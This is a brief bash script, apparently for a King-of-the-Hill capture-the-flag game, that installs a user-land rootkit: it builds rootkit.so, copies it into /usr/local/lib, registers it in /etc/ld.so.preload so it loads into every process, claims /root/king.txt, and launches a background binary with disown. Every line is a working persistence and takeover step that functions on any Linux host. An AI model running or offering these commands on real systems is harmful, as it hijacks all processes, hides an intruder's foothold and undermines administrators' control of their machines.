#!/bin/bash

make  # Since, its shared TODO: find static solution.
sudo cp ./rootkit.so /usr/local/lib/rootkit.so
echo /usr/local/lib/rootkit.so > /etc/ld.so.preload
echo profxadke > /root/king.txt
./koth.o & disown
